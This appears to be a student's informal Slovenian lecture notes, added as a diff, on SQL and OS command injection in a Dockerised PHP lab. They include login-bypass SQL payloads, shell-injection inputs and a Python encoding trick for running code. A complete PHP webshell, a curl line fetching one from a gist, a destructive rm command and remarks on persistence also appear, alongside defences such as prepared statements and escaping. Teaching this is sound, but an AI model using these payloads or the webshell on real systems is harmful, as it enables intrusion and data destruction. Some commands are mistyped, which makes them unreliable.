@@ -1,0 +1,195 @@
+Kaj je injection?
+imas input, ki ga izkoristimo da breakamo ali pa dostopamo do necesa
+
+(mešamo logiko in podatke)
+Najlepši primer je SQl za spletne strani
+
+Select Id, User FROM Users WHERE user = 'admin';
+
+Kako to zalaufamo na webu -> DAMO V NEK STRING IN EXECUTAMO
+
+da poženemo docker -> sudo systemctl start docker
+
+cat docker-compose.yml
+tole si moramo zbildat
+
+docker run --rm hello world
+pri meni je deloval sudo docker run hello-world
+
+docker nam doda grupo zato laufamo z sudo, da ni treba nasega userja dati v tisto grupo
+
+sudo docker compose up -d //poženemo v mapi web_1
+
+da vidimo vse kontejnerje: docker ps -a
+
+s tem vidimo tist hello k smo ga testiral in web_1-mysql_1 in web_1-php-1 laufata 
+in lahko vidmo na katerih portih laufa;
+en laufa na portu 80 in redirecta na 8080
+
+
+ENO od glavnih pravil:
+- Security moras delat na nacin da vsi vejo vse, kaj dela kako dela
+- varen tudi ce vsi vejo kaj dela in kako dela
+
+gremo v mapo php in odpremo index.php -> Poglejmo kaj naredi
+
+php laufa na nacin da mesamo php in html kodo skupi -> vse v istem filu
+
+<?php > se polaufa na strežniku to ne vidiš na clientu
+
+v našem html vidimo da izpiše error če obstaja
+
+error dobimo ce vnesemo invalid username ali password
+
+vidimo da dobi iz POST
+GET poslje samo http header
+POST pa poslje header in znotraj poslje se body (doda velikost body-a in body)
+
+te dodatne podatke se da sparsat (v nasem primer username in password)
+
+pogledamo spodaj form -> method = "POST"
+ta post request bo poslal na isti page (index.php) ker nismo drugace nastavili
+tja bo poslal username password in submit
+
+in če dobimo post se bo gor php izvedel
+če dobimo result v bazi nam bo $_SESSION nastavi na row
+in admina redirecta na admin.php če je pravi
+
+če pa imamo napacen vnos pa bo nastavil variable $error na "Invalid ursername or password";
+ki če je nastavljen se spodaj izpiše
+
+še pred vsem tem pa polaufa bazo in povezavo nanjo in da notr userja z random passwordom (tega bomo probal dobit)
+
+te sessioni so piskotki samo za to da vemo kdo je kdo od clientov in hranimo v $_SESSION['Username']
+
+
+RAW GRE NOTR V QUERY
+
+imamo stavek: SELECT * FROM users WHERE username = '?' AND PASSWORD = '?'
+
+tist ' se pošlje čez ker je vse znotraj "" in potem je lahko ta (?) karkoli
+
+KAKO BI TOLE ZBREAKAL -> za username bi dal <' OR 1=1 -- > ali # je koment da ne bi bil syntax error
+in ker spodaj preverja samo ce pride izpis tuki bo pa celo bazo izpisal 
+in če povlečemo prvo zadevo ni nujno da smo dobil admina!!!
+
+
+"BOOLOVA ZAPOREDJA IN je pred ALI"
+mi hocemo admina zato je treba dati notr 'admin' # --
+vse kar ta sql naredi je to da pofetcha admin userja
+treba je zapisat pa samo [ admin' # ] 
+S trem pridemo na admin.php
+
+
+KAKO SE TEGA REŠIMO?
+
+- string santization
+- prepare statements
+- ORM (Object relational mapping)
+
+ORM se zlorablja s tem da pravilno naredi te stavke, je legit resitev, super zadeva!
+problem je tam k je treba narest ročno kompleksne je spet isti problem.// ker bo neka stvar hitrej delala in tuki spet pride do injectiona
+potem je treba spet nucat string sanitization in prepare statements
+
+REGEX se slisi kul če se not pojav OR nesmes itd. //TO NI FINO KER SO VEDNO OPCIJE DA PRISES ČEZ
+
+
+npr če v python das v komentarju coding=u7
+lahko na ta način: +AAo-breakpoint() //IN TO NAREDI NEWLINE IN NASO KODO IZVEDE
+in potem ker ta breakpoint odpre debugger lahko svojo kodo izvajas in ker importas os lahko delas karkol ls itd. in gledas filesystem 
++ karkol lahko naredi komanda lahko naredis ti1!!!
+
+
+STRING SANITIZATION!
+če si dal enojni narekovaj (') -> to posles neki funkciji ki potem pravilno to escapa in je brez tega (')
+
+
+v php se te funkciji reče 
+mysqli_real_escape_string()
+
+daš mu notr unescaped string in vrne takega brez lukenj
+
+npr vnos: "admin' #" -> "admin \' #"
+z / mu odvzame funkcionalnost in ga pretovori v navaden string
+
+kar smo naredili je samo 
+$_POST['username'] = $conn->mysqli_real_escape_string($_POST['username']);
+$_POST['password'] = $conn->mysqli_real_escape_string($_POST['password']);
+
+PREPARE STATEMENTS
+že sam poskrbi za vse ti mu samo das spremenljivke
+
+nek shell izvede pa zaradi tega ker imamo v config.php
+$data = shell_exec('ping -c 4 ' . $_POST['ip']);
+tole se da izkoristit -> zgoraj samo preveri če smo res pravi v seji in če smo lahko delamo kar hočemo
+
+če damo notr burek && ls
+ne bo mogel pingat burek in && se ne bo izvedel uspešno, če pa damo nek valid ip ali pa || če vemo da bo failal
+najlažje je pa samo dati ; ls
+
+temu se rece os insertion
+in tuki se da vse narest
+kako bi preverl ce laufamo sudo -> whoami ali pa id
+
+
+vidimo da lih nimamo sudo ta apache user na dockerju nam ga ni dal.
+
+
+prej pri primeru ; ls
+lahko vidimo da nam izpise se phpinfo.php in ce bi bil nek admin control panel sam polaufamo in vidimo kaj se dogaja
+
+to zadevo lahko tudi ozbrisemo rm -lf /
+najvecja zadeva ki se nam ponavadi zgodi:
+napadalec k je to nasel hoce se vedno notr ostat-> kaksen connection si odpre nazaj ali pa si pusti neki na kar se lahko poveze
+
+php webshell -> nek php ki vse kar naaredi je to da ko dobi komando jo zalaufa
+
+primer webshella:
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+</body>
+</html>
+
+notri bi vpisal curl -o https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/c871f130a12e97090a08d0ab855c1b7a93ef1150/easy-simple-php-webshell.php
+in dobimo datotekco
+
+
+ko najdemo kaj takega in patchamo se ne pomeni da smo varni, lahko ima kdo že dostop preko druge poti
+
+opcija k jo php imaje escapeshellarg in enako escapamo kot pri databazi
+
+spremenimo v admin.php na curl in tako dobivamo ven operacije
+dopolni od jerneja
+
+
+
+
+proc_opem($cmd, array())
+//karkol shell ne bo probal sparsat ampak bo samo zalaufal ??????????
+to ni nujno zadost
+
+
+
+
+docker compose down //ugasne vse zadeve
+
+
+
+
+
+//VMES O PREDAVANJ 1.1
+prevega prebere kot 8bitov in drugega kot 24bitov
+se pretvori kot 1.0.0.1 k je drugi cloudndns
+
